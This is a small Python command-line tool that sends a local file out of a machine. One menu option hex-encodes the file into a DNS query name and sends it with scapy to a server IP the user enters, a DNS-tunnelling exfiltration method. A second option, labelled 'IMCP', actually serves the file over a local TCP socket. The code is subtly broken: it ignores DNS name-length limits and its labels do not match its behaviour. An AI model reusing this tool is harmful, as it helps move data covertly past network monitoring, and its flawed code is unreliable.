import socket
from scapy.all import DNS, DNSQR, IP, send, UDP
import binascii
import os

def display_menu():
    print("1. Send a file by DNS ")
    print("2. Send a file by IMCP ")
    print("3. Exit ")

def file_to_hex(file_path):
    with open(file_path, 'rb') as file:
        binary_data = file.read()
    return binascii.hexlify(binary_data).decode()

def send_file_dns(server_ip, file_path):
    hex_data = file_to_hex(file_path)

    # Encode the file data into a domain name
    domain = hex_data + '.example.com'

    # Create a DNS query with the domain name
    packet = IP(dst=server_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname=domain))

    # Send the packet
    send(packet)

def send_file_imcp():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 12345)) #if the clients/server are on different network you shall bind to ('', port)

    s.listen(10)
    c, addr = s.accept()
    print('{} connected.'.format(addr))

    f = open("file.txt", "rb")
    l = os.path.getsize("file.txt")
    m = f.read(l)
    c.sendall(m)
    f.close()
    print("Terminé...")


def main():
    while True:
        display_menu()
        choice = input("Enter your choice: ")
        if choice == "1":
            server_ip = input("Enter server IP: ")
            send_file_dns(server_ip, 'file.txt')
        elif choice == "2":
            # server_ip = input("Enter server IP: ")
            # send_file_imcp('', 'file.txt')
            send_file_imcp()
        elif choice == "3":
            print("Exit")
            break
        else:
            print("Invalid choice")        

main()